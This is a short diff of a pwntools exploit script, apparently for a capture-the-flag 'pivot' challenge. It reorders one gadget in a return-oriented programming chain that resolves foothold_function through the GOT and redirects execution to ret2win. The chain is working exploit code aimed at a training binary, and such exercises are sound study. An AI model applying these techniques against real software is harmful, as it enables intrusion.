@@ -70,9 +70,9 @@ attack = p64(exe.plt["foothold_function"])
 # after foothold_function returns to us
 # the got entry of foothold_function stores the location of the actual foothold_function
 attack += POPRAX + p64(exe.got["foothold_function"])
-attack += POPRBP + p64(libpivot.symbols["ret2win"] - libpivot.symbols["foothold_function"]) # offset
 # load the location of foothold_function from foothold_function@got
 attack += MOVRAXRAX # mov rax, [rax] ; ret
+attack += POPRBP + p64(libpivot.symbols["ret2win"] - libpivot.symbols["foothold_function"]) # offset
 attack += ADDRAXRBP # add offset
 attack += CALLRAX
 
